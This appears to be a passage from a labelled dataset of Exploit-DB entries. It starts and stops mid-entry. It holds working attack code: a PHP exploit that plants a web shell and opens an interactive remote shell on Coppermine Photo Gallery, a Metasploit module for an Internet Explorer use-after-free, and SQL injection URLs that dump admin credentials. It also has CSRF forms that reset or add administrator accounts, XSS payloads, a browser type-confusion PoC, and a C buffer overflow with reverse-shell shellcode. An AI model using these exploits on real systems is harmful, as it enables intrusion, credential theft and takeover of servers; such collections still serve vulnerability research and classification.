preg_match(""/_LfI_/"", $resp)) return true; 		 		sleep(1); 	} 	 	return false; }  print ""\n+-------------------------------------------------------------------------+""; print ""\n| Coppermine Photo Gallery <= 1.4.18 LFI / Code Execution Exploit by EgiX |""; print ""\n+-------------------------------------------------------------------------+\n"";  if ($argc < 3) { 	print ""\nUsage...: php $argv[0] host path\n""; 	print ""\nhost....: target server (ip/hostname)""; 	print ""\npath....: path to cpg directory\n""; 	die(); }  $host = $argv[1]; $path = $argv[2];  get_info();  print ""\n[-] Version..........: {$version}""; print ""\n[-] Cookie name......: {$cookie}""; print ""\n[-] Path disclosure..: {$path_disc}\n\n"";  if (first_time()) { 	$code = base64_decode( 	""PD9waHA7JGY9Zm9wZW4oY2hyKDExMikuY2hyKDExNCkuY2hyKDExMSkuY2hyKDExMSkuY2hyKDEwMikuY2hyKDQ2KS5jaHIoM"" . 	""TEyKS5jaHIoMTA0KS5jaHIoMTEyKSxjaHIoMTE5KSk7ZndyaXRlKCRmLGNocig2MCkuY2hyKDYzKS5jaHIoMTEyKS5jaHIoMT"" . 	""A0KS5jaHIoMTEyKS5jaHIoMzIpLmNocigxMDEpLmNocig5OSkuY2hyKDEwNCkuY2hyKDExMSkuY2hyKDMyKS5jaHIoMzkpLmN"" . 	""ocig5NSkuY2hyKDk5KS5jaHIoMTExKS5jaHIoMTAwKS5jaHIoMTAxKS5jaHIoOTUpLmNocigzOSkuY2hyKDU5KS5jaHIoMzIp"" . 	""LmNocigxMTIpLmNocig5NykuY2hyKDExNSkuY2hyKDExNSkuY2hyKDExNikuY2hyKDEwNCkuY2hyKDExNCkuY2hyKDExNykuY"" . 	""2hyKDQwKS5jaHIoOTgpLmNocig5NykuY2hyKDExNSkuY2hyKDEwMSkuY2hyKDU0KS5jaHIoNTIpLmNocig5NSkuY2hyKDEwMC"" . 	""kuY2hyKDEwMSkuY2hyKDk5KS5jaHIoMTExKS5jaHIoMTAwKS5jaHIoMTAxKS5jaHIoNDApLmNocigzNikuY2hyKDk1KS5jaHI"" . 	""oODMpLmNocig2OSkuY2hyKDgyKS5jaHIoODYpLmNocig2OSkuY2hyKDgyKS5jaHIoOTEpLmNocigzOSkuY2hyKDcyKS5jaHIo"" . 	""ODQpLmNocig4NCkuY2hyKDgwKS5jaHIoOTUpLmNocig2NykuY2hyKDc3KS5jaHIoNjgpLmNocigzOSkuY2hyKDkzKS5jaHIoN"" . 	""DEpLmNocig0MSkuY2hyKDU5KS5jaHIoMzIpLmNocig2MykuY2hyKDYyKSk7ZmNsb3NlKCRmKTtkaWUoX0xmSV8pOz8+""); 		 	$packet  = ""GET {$path}{$code} HTTP/1.0\r\n""; 	$packet .= ""Host: {$host}\r\n""; 	$packet .= ""User-Agent: {$code}\r\n""; 	$packet .= ""Connection: close\r\n\r\n"";  	http_send($host, $packet);  	if (!lfi()) die(""\n[-] Exploit failed...\n""); }  while(1) { 	print ""\ncoppermine-shell# ""; 	$cmd = trim(fgets(STDIN)); 	if ($cmd != ""exit"") 	{ 		$packet = ""GET {$path}proof.php HTTP/1.0\r\n""; 		$packet.= ""Host: {$host}\r\n""; 		$packet.= ""Cmd: "".base64_encode($cmd).""\r\n""; 		$packet.= ""Connection: close\r\n\r\n""; 		list($header, $payload) = explode(""_code_"", http_send($host, $packet)); 		preg_match(""/200 OK/"", $header) ? print ""\n{$payload}"" : die(""\n[-] Exploit failed...\n""); 	} 	else break; }  ?>  # milw0rm.com [2008-07-31]",Remote Code Execution,1
26044,MDaemon 8.0 - Content Filter Directory Traversal source: https://www.securityfocus.com/bid/14400/info  MDaemon server is prone to a directory traversal vulnerability due to improper sanitization of user input.  Failure to sanitize the filename and path may result in compromise of the file system outside of the application's quarantine directory.   The following email attachment filename example was provided:  '../../../../../file.exe',Content Filter Directory Traversal,1
32904,"Microsoft Internet Explorer - CMarkup Use-After-Free (MS14-012) (Metasploit) ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::Remote::BrowserExploitServer    def initialize(info={})     super(update_info(info,       'Name'           => ""MS14-012 Microsoft Internet Explorer CMarkup Use-After-Free"",       'Description'    => %q{         This module exploits an use after free condition on Internet Explorer as used in the wild         on the ""Operation SnowMan"" in February 2014. The module uses Flash Player 12 in order to         bypass ASLR and finally DEP.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'Unknown', # Vulnerability discovery and Exploit in the wild           'Jean-Jamil Khalife', # Exploit           'juan vazquez' # Metasploit module         ],       'References'     =>         [           [ 'CVE', '2014-0322' ],           [ 'MSB', 'MS14-012' ],           [ 'BID', '65551' ],           [ 'URL', 'http://www.fireeye.com/blog/technical/cyber-exploits/2014/02/operation-snowman-deputydog-actor-compromises-us-veterans-of-foreign-wars-website.html'],           [ 'URL', 'http://hdwsec.fr/blog/CVE-2014-0322.html' ]         ],       'Platform'       => 'win',       'Arch'           => ARCH_X86,       'Payload'        =>         {           'Space'          => 960,           'DisableNops'    => true,           'PrependEncoder' => stack_adjust         },       'BrowserRequirements' =>         {           :source      => /script|headers/i,           :os_name     => Msf::OperatingSystems::WINDOWS,           :os_flavor   => Msf::OperatingSystems::WindowsVersions::SEVEN,           :ua_name     => Msf::HttpClients::IE,           :ua_ver      => '10.0',           :mshtml_build => lambda { |ver| ver.to_i < 16843 },           :flash       => /^12\./         },       'DefaultOptions' =>         {           'InitialAutoRunScript' => 'migrate -f',           'Retries'              => false         },       'Targets'        =>         [           [ 'Windows 7 SP1 / IE 10 / FP 12', { } ],         ],       'Privileged'     => false,       'DisclosureDate' => ""Feb 13 2014"",       'DefaultTarget'  => 0))    end    def stack_adjust     adjust = ""\x64\xa1\x18\x00\x00\x00""  # mov eax, fs:[0x18 # get teb     adjust << ""\x83\xC0\x08""             # add eax, byte 8 # get pointer to stacklimit     adjust << ""\x8b\x20""                 # mov esp, [eax] # put esp at stacklimit     adjust << ""\x81\xC4\x30\xF8\xFF\xFF"" # add esp, -2000 # plus a little offset      adjust   end    def create_swf     path = ::File.join( Msf::Config.data_directory, ""exploits"", ""CVE-2014-0322"", ""AsXploit.swf"" )     fd = ::File.open( path, ""rb"" )     swf = fd.read(fd.stat.size)     fd.close     return swf   end    def exploit     @swf = create_swf     super   end    def on_request_uri(cli, request)     print_status(""Request: #{request.uri}"")      if request.uri =~ /\.swf$/       print_status(""Sending SWF..."")       send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Pragma' => 'no-cache'})       return     end      super   end    def on_request_exploit(cli, request, target_info)     print_status(""Sending HTML..."")     send_exploit_html(cli, exploit_template(cli, target_info))   end    def exploit_template(cli, target_info)      flash_payload = """"     get_payload(cli,target_info).unpack(""V*"").each do |i|       flash_payload << ""0x#{i.to_s(16)},""     end     flash_payload.gsub!(/,$/, """")      html_template = %Q|     <html>     <head>     </head>     <body>      <script>      var g_arr = [];     var arrLen = 0x250;      function dword2data(dword)     {       var d = Number(dword).toString(16);       while (d.length < 8)         d = '0' + d;        return unescape('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));     }      function eXpl()     {       var a=0;        for (a=0; a < arrLen; a++) {           g_arr[a] = document.createElement('div');       }        var b = dword2data(0x19fffff3);        while (b.length < 0x360) {         if (b.length == (0x98 / 2))         {           b += dword2data(0x1a000010);         }         else if (b.length == (0x94 / 2))         {           b += dword2data(0x1a111111);         }         else if (b.length == (0x15c / 2))         {           b += dword2data(0x42424242);         }         else         {           b += dword2data(0x19fffff3);         }       }        var d = b.substring(0, ( 0x340 - 2 )/2);        try{         this.outerHTML=this.outerHTML       } catch(e){        }        CollectGarbage();        for (a=0; a < arrLen; a++)         {           g_arr[a].title = d.substring(0, d.length);         }     }      function trigger()     {         var a = document.getElementsByTagName(""script"");         var b = a[0];         b.onpropertychange = eXpl;         var c = document.createElement('SELECT');         c = b.appendChild(c);     }      </script>     <embed src=#{rand_text_alpha(4 + rand(3))}.swf FlashVars=""version=<%=flash_payload%>"" width=""10"" height=""10"">     </embed>     </body>     </html>     |      return html_template, binding()   end  end",Use-After-Free,1
7224,"FAQ Manager 1.2 - 'categorie.php' SQL Injection +---------------------------------------------------------------------------------------+ |                                                                                       | |       FAQ Manager 1.2 (categorie.php cat_id) Remote SQL Injection Vulnerability       | |       Bug found by cOndemned                                                          | |                                                                                       | |       Script site  : http://www.4yoursite.nl/script_faq_manager.php                   | |                                                                                       | |       Greetz: ZaBeaTy, str0ke, doctor, Necro, 0in, TBH, Av...                         | |                                                                                       | +---------------------------------------------------------------------------------------+   # source of categorie.php  	[ ... ]  	 	21.	$catid = $_GET['cat_id']; 	 	[ ... ] 	 	72.	$faq_query = mysql_query(""SELECT * FROM `"".$prefix.""_faq` WHERE `faq_cat_id` = $catid"");  	73.	while($faq = mysql_fetch_assoc($faq_query))  	74.	{  	75.		$faq_cat_id = ($faq['faq_cat_id']);  	76.	}  	77.  	78.	$result = mysql_query(""SELECT * FROM `"".$prefix.""_faq` WHERE `faq_cat_id` = $catid""); 	 	[ ... ]    # proof of concept  	http://[host]/[faq_manager_path]/catagorie.php?cat_id=3+union+select+1,2,concat_ws(0x3a,admin_name,admin_pass),4,5+from+faq_admin/*   # live demo  	 	http://www.4yoursite.nl/demo/faq_manager/catagorie.php?cat_id=3+union+select+1,2,concat_ws(0x3a,admin_name,admin_pass),4,5+from+faq_admin/*  # milw0rm.com [2008-11-25]",Remote SQL Injection,1
39705,"WordPress Plugin Kento Post View Counter 2.8 - Cross-Site Request Forgery / Cross-Site Scripting I would like to disclose  CSRF and stored XSS vulnerability in Kento post view counter plugin version 2.8 .  The vulnerable Fields for XSS are       kento_pvc_numbers_lang     kento_pvc_today_text     kento_pvc_total_text  The combination of CSRF and XSS in this plugin can lead to huge damage of the website, as the two fields kento_pvc_today_text and kento_pvc_total_text are reflected on all authenticated users as well as non-authenticated user ,all the post have a footer which shows this two parameter reflected in them ,so if an attacker successfully attacks a website almost all the pages on that website will execute the malicious javascript payload on all the clients browsers visiting that website.every user visiting the website will be affected.     The plugin can be found at https://wordpress.org/plugins/kento-post-view-counter/   This CSRF is tested on latest wordpress installation 4.4.2 using firefox browser.  and chrome.   The Code for CSRF.html is   <html>   <body>     <form action=""http://targetsite/wp-admin/admin.php?page=kentopvc_settings"" method=""POST"">       <input type=""hidden"" name=""kentopvc_hidden"" value=""Y"" />       <input type=""hidden"" name=""option_page"" value=""kento_pvc_plugin_options"" />       <input type=""hidden"" name=""action"" value=""update"" />       <input type=""hidden"" name=""_wpnonce"" value="""" />       <input type=""hidden"" name=""_wp_http_referer"" value="""" />       <input type=""hidden"" name=""kento_pvc_posttype[post]"" value=""1"" />       <input type=""hidden"" name=""kento_pvc_posttype[page]"" value=""1"" />       <input type=""hidden"" name=""kento_pvc_posttype[attachment]"" value=""1"" />       <input type=""hidden"" name=""kento_pvc_posttype[revision]"" value=""1"" />       <input type=""hidden"" name=""kento_pvc_posttype[nav_menu_item]"" value=""1"" />       <input type=""hidden"" name=""kento_pvc_numbers_lang"" value="""" />       <input type=""hidden"" name=""kento_pvc_today_text"" value=""""<script>alert(1);</script><img src=""b"" />       <input type=""hidden"" name=""kento_pvc_total_text"" value="""" />       <input type=""hidden"" name=""Submit"" value=""Save Changes"" />       <input type=""submit"" value=""Submit form"" />     </form>   </body> </html>  The Vulnerable page is   wp-content\plugins\kento-post-view-counter\kento-pvc-admin.php  The code Reponsible for XSS :  if($_POST['kentopvc_hidden'] == 'Y') { //Form data sent if(empty($_POST['kento_pvc_hide'])) { $kento_pvc_hide =""""; } else { $kento_pvc_hide = $_POST['kento_pvc_hide']; } update_option('kento_pvc_hide', $kento_pvc_hide);    if(empty($_POST['kento_pvc_posttype'])) { $kento_pvc_posttype =""""; } else { $kento_pvc_posttype = $_POST['kento_pvc_posttype']; } update_option('kento_pvc_posttype', $kento_pvc_posttype); if(empty($_POST['kento_pvc_uniq'])) { $kento_pvc_uniq =""""; } else { $kento_pvc_uniq = $_POST['kento_pvc_uniq']; } update_option('kento_pvc_uniq', $kento_pvc_uniq);   $kento_pvc_numbers_lang = $_POST['kento_pvc_numbers_lang']; update_option('kento_pvc_numbers_lang', $kento_pvc_numbers_lang);  $kento_pvc_today_text = $_POST['kento_pvc_today_text']; update_option('kento_pvc_today_text', $kento_pvc_today_text);  $kento_pvc_total_text = $_POST['kento_pvc_total_text']; update_option('kento_pvc_total_text', $kento_pvc_total_text);   --------------------------snip----------------------- ------------------snip ------------------------------     <input type=""text"" size=""20"" name=""kento_pvc_numbers_lang"" id=""kento-pvc-numbers-lang""   value =""<?php if (isset($kento_pvc_numbers_lang)) echo $kento_pvc_numbers_lang; ?>"" placeholder=""0,1,2,3,4,5,6,7,8,9""   /><br />**Write numbers in your language as following 0,1,2,3,4,5,6,7,8,9<br />    Left blank if you are in English.    <tr valign=""top""> <th scope=""row"">Text For Today View</th> <td style=""vertical-align:middle;"">     <input type=""text"" size=""20"" name=""kento_pvc_today_text"" id=""kento-pvc-today-text""   value =""<?php if (isset($kento_pvc_today_text)) echo $kento_pvc_today_text; ?>"" placeholder=""Views Today ""   />  </td> </tr>   <tr valign=""top""> <th scope=""row"">Text For Total View</th> <td style=""vertical-align:middle;"">     <input type=""text"" size=""20"" name=""kento_pvc_total_text"" id=""kento-pvc-total-text""   value =""<?php if (isset($kento_pvc_total_text)) echo $kento_pvc_total_text; ?>"" placeholder=""Total Views ""   />  </td> </tr>    No anti-CSRF token used on this form  :  All though the WordPress sends the _wpnonce value but it does not protect this form against CSRF.   # Author email: cor3sm4sh3r[at]gmail.com # Contact: https://in.linkedin.com/in/cor3sm4sh3r # Twitter: https://twitter.com/cor3sm4sh3r",Cross-Site Request Forgery,1
36702,"Basic Analysis and Security Engine (BASE) 1.4.5 - 'base_db_setup.php?base_path' Remote File Inclusion source: https://www.securityfocus.com/bid/51979/info  BASE is prone to a security-bypass vulnerability and multiple remote file-include vulnerabilities.  An attacker can exploit these issues to gain unauthorized access, obtain potentially sensitive information, or execute arbitrary script code in the context of the webserver process. This may allow the attacker to compromise the application and the computer; other attacks are also possible.  BASE 1.4.5 is vulnerable; other versions may be affected.   Function: include    File: base_db_setup.php            Line: 1 Exploit: http://www.example.com/base/base_db_setup.php?BASE_path=[EV!L]",Remote File Inclusion,1
22730,"Mailtraq 2.2 - 'Browse.asp' Cross-Site Scripting source: https://www.securityfocus.com/bid/7813/info  Mailtraq is vulnerable to cross-site scripting attacks. The vulnerability exists due to insufficient sanitization of HTTP requests to the vulnerable Mailtraq server.  An attacker can exploit this vulnerability by manipulating the 'cfolder' URI parameter to the browse.asp script and sending a link to a victim user. If this link is visited, the attacker-supplied code may be rendered in the browser of the user who visit the malicious link.   http://www.example.org/browse.asp?<script>alert(document.cookie)</script>",cross-site scripting attacks,1
7981,"Power System Of Article Management 3.0 - File Disclosure / Cross-Site Scripting ######################################################### --------------------------------------------------------- Portal Name: Power System Of Article Management Version : 3.0 Author : Pouya_Server , Pouya.s3rver@Gmail.com Vulnerability : (DD/XSS) --------------------------------------------------------- ######################################################### [DD]: http://site.com/[Path]/database/yiuwekdsodksldfslwifds.mdb Hash Decoder : http://pouya2006.persiangig.com/dec/PSOAMv3.html or Google searching ...   [XSS]: http://site.com/[Path]/userchklogin.asp?UserName=Pouya&Password=Pouya&CookieDate=0&ComeUrl=>""><ScRiPt%20%0a%0d>alert(1369)%3B</ScRiPt>&Submit=%C8%B7%C8%CF  http://site.com/[Path]/userlogin.asp?ComeUrl=>""><ScRiPt%20%0a%0d>alert(1369)%3B</ScRiPt> --------------------------------- Victem : http://www.honeyjenny.com/art http://www.hzyzzz.com http://cdzy.cn/wyx/article http://unix-cd.com/article http://zhuyaren.com http://www.ahss.gov.cn --------------------------------------------------------- #########################################################  # milw0rm.com [2009-02-04]",Cross-Site Scripting,1
44817,"Microsoft Edge Chakra - EntrySimpleObjectSlotGetter Type Confusion /* function opt(w, arr) {     arr[0] = 1.1;     let res = w.event;     arr[0] = 2.3023e-320;     return res; }  let arr = [1.1]; for (let i = 0; i < 10000; i++) {     opt(window, arr); }  The above code will be compiled as follows: 000001a8`8000122b 48b8503dcfd5ff7f0000 mov rax,offset chakra!DOMFastPath<7>::EntrySimpleObjectSlotGetter (00007fff`d5cf3d50)  // w.event 000001a8`80001235 48ffd0          call    rax 000001a8`80001238 488b8e30bdf0ff  mov     rcx,qword ptr [rsi-0F42D0h] 000001a8`8000123f f2480f104158    movsd   xmm0,mmword ptr [rcx+58h] 000001a8`80001245 f2490f11442418  movsd   mmword ptr [r12+18h],xmm0  // arr[0] = 2.3023e-320; ...  As you can see, there's no ""ImplicitCallFlags"" check after the call to the ""EntrySimpleObjectSlotGetter"" method. The code was generated based on the assumption that the method has no side effects. But in fact, the method can have side effects. The method wraps the return value using the ""CrossSite::MarshalVar"" method which traverses up the prototype chain of the given object using the ""GetPrototype"" method, since the ""GetPrototype"" method may invoke the ""getPrototypeOf"" handler of a Proxy object, changing the type of the array in the handler will lead to type confusion.  PoC: */  function opt(w, arr) {     arr[0] = 1.1;     let res = w.event;     arr[0] = 2.3023e-320;     return res; }  function main() {     let f = document.body.appendChild(document.createElement('iframe'));     f.contentWindow;      for (let i = 0; i < 100000; i++) {         opt(window, [1.1]);     }      let set_callback = new f.contentWindow.Function('callback', `         window.__lookupSetter__('event').call(parent, new Proxy({}, {             getPrototypeOf() {                 callback();                 return {};             }         }));`);      let arr = [1.1];     set_callback(() => {         arr[0] = {};     });      opt(window, arr);     alert(arr); }  main();",Type Confusion,1
48231,"Microsoft VSCode Python Extension - Code Execution # VSCode Python Extension Code Execution  This repository contains the Proof-of-Concept of a code execution vulnerability discovered in the [Visual Studio Code](https://code.visualstudio.com/) Python extension.  >TL;DR: VScode may use code from a virtualenv found in the project folders without asking the user, for things such as formatting, autocompletion, etc. This insecure design leads to arbitrary code execution by simply cloning and opening a malicious Python repository.  You can read more about this vulnerability on our blog: [https://blog.doyensec.com/2020/03/16/vscode_codeexec.html](https://blog.doyensec.com/2020/03/16/vscode_codeexec.html).  ## HowTo  - Clone the 'malicious' repository with `git clone https://github.com/doyensec/VSCode_PoC_Oct2019.git` - Add the cloned repo to a VSCode workspace on macOS. Note that the vulnerability affects all platforms, but the PoC is executing *Calculator.app* - Open `test.py` in VScode   Download ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/48231.zip",Code Execution,1
22917,"Microsoft Windows - DCOM RPC Interface Buffer Overrun source: https://www.securityfocus.com/bid/8205/info     A buffer overrun vulnerability has been reported in Microsoft Windows that can be exploited remotely via a DCOM RPC interface that listens on TCP/UDP port 135. The issue is due to insufficient bounds checking of client DCOM object activation requests. Exploitation of this issue could result in execution of malicious instructions with Local System privileges on an affected system.     This issue may be exposed on other ports that the RPC Endpoint Mapper listens on, such as TCP ports 139, 135, 445 and 593. This has not been confirmed. Under some configurations the Endpoint Mapper may receive traffic via port 80.     ** There have been unconfirmed reports that Windows 9x systems with certain software installed may also be vulnerable to this issue. Reportedly, Windows 98 systems with .NET software installed may be vulnerable according to scans using various DCOM RPC vulnerability scanning tools. Symantec has not confirmed this behaviour and it may in fact be due to false positives generated by the scanners.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/22917.zip",Interface Buffer Overrun,1
42004,"Mailcow 0.14 - Cross-Site Request Forgery [+] Credits: John Page a.k.a hyp3rlinx	 [+] Website: hyp3rlinx.altervista.org [+] Source:  http://hyp3rlinx.altervista.org/advisories/MAILCOW-v0.14-CSRF-PASSWORD-RESET-ADD-ADMIN.txt [+] ISR: ApparitionSec                 Vendor: ============= mailcow.email mailcow.github.io    Product: =========== The integrated mailcow UI allows administrative work on your mail server instance as well as separated domain administrator and mailbox user access.    Vulnerability Type: =================== CSRF Password Reset / Add Admin / Delete Domains    CVE Reference: ============== CVE-2017-8928    Security Issue: ================ mailcow 0.14, as used in ""mailcow: dockerized"" and other products, has CSRF vulnerabilities. If authenticated mailcow user visits a malicious webpage remote attackers can execute the following exploits.   1) reset admin password 2) add arbitrary admin 3) delete domains    Other issues found in mailcow are as follows:  Session fixation: ================= Session ID: Pre authentication and Post auth is the same, and does not change upon successful login.  ms22jsnl1dcpc4519rvpvfj0n6 - pre-authentication ms22jsnl1dcpc4519rvpvfj0n6 - post-authentication   World Readable Private key ""key.pem"" ==================================== john@debian:/usr/local/mailcow-dockerized-master/data/assets/ssl$ whoami  john  john@debian:/usr/local/mailcow-dockerized-master/data/assets/ssl$ cat key.pem   -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEA0YNMU9wLfQ0m9x+TjKdytTKVwIGMqLUiuk0utXwtEBB8tnzF 4sLOwIHMnui5+whutxXtXjdo5HZXn8vcSYr0vMucNDPItevL+c58wvH58pS9ojok mHyvwf6BKn1O2B+EXHoDud6AwyFGZouBa4J7u9/VVTlNWchxFahidh9mgCJKGUYx s7pg/WJuC1honbSicwYBbf6poVHll4qTPMNvNV5EJyVO/fsdssJyUrxGd6/2VSQu 5G44lcPv5NeZPQsZOiJPMJidF//sVsaGaJh0CNSzNFSgEv4mlPeXZ9m6Zby+o04o slgG6zI0irOF2z7f3yGzonDZI+vghctDFX8shwIDAQABAoIBAQC9kiLnIgxXGyZt pmmYdA6re1jatZ2zLSp+DcY8ul3/0hs195IKCyCOOSQPiR520Pt0t+duP46uYZIJ  etc...   References: ============ https://github.com/mailcow/mailcow-dockerized/pull/268/commits/3c937f75ba5853ada175542d5c4849fb95eb64cd    Exploit/POC: =============  [Admin Password Reset]  <form action=""https://localhost/admin.php"" method=""post""> <input type=""hidden"" name=""admin_user_now"" value=""admin""> <input type=""hidden"" name=""admin_user"" value=""admin""> <input type=""hidden"" name=""admin_pass"" value=""Abc12345""> <input type=""hidden"" name=""admin_pass2"" value=""Abc12345""> <input type=""hidden"" name=""trigger_set_admin"" value=""""> <script>document.forms[0].submit()</script> </form>   HTTP Response:  'Changes to administrator have been saved""  //////////////////////   [Add Admin]  <form action=""https://localhost/admin.php"" method=""post""> <input type=""hidden"" name=""username"" value=""HELL""> <input type=""hidden"" name=""password"" value=""Abc12345""> <input type=""hidden"" name=""password2"" value=""Abc12345""> <input type=""hidden"" name=""active"" value=""on""> <input type=""hidden"" name=""trigger_add_domain_admin"" value=""localhost""> <script>document.forms[0].submit()</script> </form>   ////////////////////   [Delete domains]  https://localhost/mailbox.php domain=myDomain&trigger_mailbox_action=deletedomain    Network Access: =============== Remote    Severity: ========= Medium    Disclosure Timeline: ================================= Vendor Notification:  May 6, 2017 Vendor releases fix:  May 6, 2017 May 14, 2017  : Public Disclosure    [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. All content (c).  hyp3rlinx",Cross-Site Request Forgery,1
2689,"Novell eDirectory 9.0 - 'DHost' Remote Buffer Overflow /*        _______         ________           .__        _____          __ ___  __\   _  \   ____ \_____  \          |  |__    /  |  |   ____ |  | __ \  \/  /  /_\  \ /    \  _(__  <   ______ |  |  \  /   |  |__/ ___\|  |/ /  >    <\  \_/   \   |  \/       \ /_____/ |   Y  \/    ^   /\  \___|    < /__/\_ \\_____  /___|  /______  /         |___|  /\____   |  \___  >__|_ \       \/      \/     \/       \/   30\10\06    \/      |__|      \/     \/         *   mm.           dM8  *  YMMMb.       dMM8      _____________________________________  *   YMMMMb     dMMM'     [                                     ]  *    `YMMMb   dMMMP      [ There are doors I have yet to open  ]  *      `YMMM  MMM'       [ windows I have yet to look through  ]  *         ""MbdMP         [ Going forward may not be the answer ]  *     .dMMMMMM.P         [                                     ]  *    dMM  MMMMMM         [       maybe I should go back        ]  *    8MMMMMMMMMMI        [_____________________________________]  *     YMMMMMMMMM                   www.netbunny.org  *       ""MMMMMMP  *      MxM .mmm  *      W""W """"""    [i] Title:              Novell eDirectory <= 9.0 DHost Buffer overflow exploit [i] Discovered by:      Novell [i] Original code by:   FistFuXXer [i] Exploit by:         Expanders [i] Filename:           XHNB-Novell-eDirectory_remote_bof.c [i] References:         http://www.novell.com/ [i] Greatings:          x0n3-h4ck - netbunny  [ Research diary ]  After a try of FistFuXXer's perl exploit I started to port the code in C and also use a different exploiting method.  This exploit overwrite the Second Exception Handler to take control of the program flow.  [ Special thanks ]  FistFuXXer H D Moore  [ Links ]  www.x0n3-h4ck.org www.netbunny.org  */  #include <stdio.h> #include <sys/socket.h> #include <sys/types.h> #include <sys/stat.h> #include <netinet/in.h> #include <netdb.h> #include <unistd.h>  #define BUFFSIZE 1000 // Buffer size #define DEADRET ""\xde\xc0\xad\xde"" // this address cause the exception to be called  int banner(); int usage(char *filename); int inject(char *port, char *ip); int remote_connect( char* ip, unsigned short port );   char attack[] = ""GET /nds HTTP/1.1\r\n"" ""Host: %s\r\n\r\n"";  /* win32_reverse -  EXITFUNC=seh Size=312 Encoder=Pex http://metasploit.com */ char shellcode[] = ""\x29\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x3f"" ""\x61\x88\x6f\x83\xeb\xfc\xe2\xf4\xc3\x0b\x63\x22\xd7\x98\x77\x90"" ""\xc0\x01\x03\x03\x1b\x45\x03\x2a\x03\xea\xf4\x6a\x47\x60\x67\xe4"" ""\x70\x79\x03\x30\x1f\x60\x63\x26\xb4\x55\x03\x6e\xd1\x50\x48\xf6"" ""\x93\xe5\x48\x1b\x38\xa0\x42\x62\x3e\xa3\x63\x9b\x04\x35\xac\x47"" ""\x4a\x84\x03\x30\x1b\x60\x63\x09\xb4\x6d\xc3\xe4\x60\x7d\x89\x84"" ""\x3c\x4d\x03\xe6\x53\x45\x94\x0e\xfc\x50\x53\x0b\xb4\x22\xb8\xe4"" ""\x7f\x6d\x03\x1f\x23\xcc\x03\x2f\x37\x3f\xe0\xe1\x71\x6f\x64\x3f"" ""\xc0\xb7\xee\x3c\x59\x09\xbb\x5d\x57\x16\xfb\x5d\x60\x35\x77\xbf"" ""\x57\xaa\x65\x93\x04\x31\x77\xb9\x60\xe8\x6d\x09\xbe\x8c\x80\x6d"" ""\x6a\x0b\x8a\x90\xef\x09\x51\x66\xca\xcc\xdf\x90\xe9\x32\xdb\x3c"" ""\x6c\x22\xdb\x2c\x6c\x9e\x58\x07\x35\x61\x88\x6c\x59\x09\x8c\x69"" ""\x59\x32\x01\x8e\xaa\x09\x64\x96\x95\x01\xdf\x90\xe9\x0b\x98\x3e"" ""\x6a\x9e\x58\x09\x55\x05\xee\x07\x5c\x0c\xe2\x3f\x66\x48\x44\xe6"" ""\xd8\x0b\xcc\xe6\xdd\x50\x48\x9c\x95\xf4\x01\x92\xc1\x23\xa5\x91"" ""\x7d\x4d\x05\x15\x07\xca\x23\xc4\x57\x13\x76\xdc\x29\x9e\xfd\x47"" ""\xc0\xb7\xd3\x38\x6d\x30\xd9\x3e\x55\x60\xd9\x3e\x6a\x30\x77\xbf"" ""\x57\xcc\x51\x6a\xf1\x32\x77\xb9\x55\x9e\x77\x58\xc0\xb1\xe0\x88"" ""\x46\xa7\xf1\x90\x4a\x65\x77\xb9\xc0\x16\x74\x90\xef\x09\x78\xe5"" ""\x3b\x3e\xdb\x90\xe9\x9e\x58\x6f"";  char jmpback[]= //22 byte xor decoder (0x55) ""\xEB\x0F\x5B\x33\xC9\x66\x83\xE9\xE0\x80\x33\x55\x43\xE2\xFA\xEB\x05\xE8\xEC\xFF\xFF\xFF"" //(20 byte jump-back code -> 256 + 256 + 64 bytes) ""\x8C\xBB\x8C\x21\x71\xA1\x0C\xD5\x94\x5F\xC5\xAB\x98\xAB\x98\xD5\xBC\x15\xAA\xB4"";  char jmpover[]= // 2 bytes jump 6 bytes over - 2 bytes NOP ""\xEb\x06\x90\x90"";  struct retcodes{char *platform;unsigned long addr;} targets[]= {         { ""eDirectory MFC42U.dll"", 0x5f80bbf7 },         { ""Windows NT SP 5/6""    , 0x776a1082 },   // ws2help.dll pop esi, pop ebx, retn  [Tnx to metasploit] 	{ ""Windows 2k Universal"" , 0x750211a9 },   // ws2help.dll pop ebp, pop ebx, retn  [Tnx to metasploit] 	{ ""Windows XP Universal"" , 0x71abe325 },   // ws2help.dll pop ebx, pop ebp, retn  [Tnx to metasploit] 	{ NULL } }; int banner() {   printf(""\n       _______         ________           .__        _____          __     \n"");   printf(""___  __\\   _  \\   ____ \\_____  \\          |  |__    /  |  |   ____ |  | __ \n"");   printf(""\\  \\/  /  /_\\  \\ /    \\  _(__  <   ______ |  |  \\  /   |  |__/ ___\\|  |/ / \n"");   printf("" >    <\\  \\_/   \\   |  \\/       \\ /_____/ |   Y  \\/    ^   /\\  \\___|    <  \n"");   printf(""/__/\\_ \\\\_____  /___|  /______  /         |___|  /\\____   |  \\___  >__|_ \\ \n"");   printf(""      \\/      \\/     \\/       \\/               \\/      |__|      \\/     \\/ \n\n"");   printf(""[i] Title:        \tNovell eDirectory DHost Buffer overflow\n"");   printf(""[i] Perl Code by:\tFistFuXXer\n"");   printf(""[i] Exploit by:   \tExpanders\n\n"");   return 0; }  int usage(char *filename) {   int i;   printf(""Usage: \t%s <host> <port> <l_ip> <l_port> <targ>\n\n"",filename);   printf(""       \t<host>   : Victim's host\n"");   printf(""       \t<port>   : Victim's port  ::  Default: 8028\n"");   printf(""       \t<l_ip>   : Local ip address for connectback\n"");   printf(""       \t<l_port> : Local port for connectback\n"");   printf(""       \t<targ>   : Target from the list below\n\n"");      printf(""# 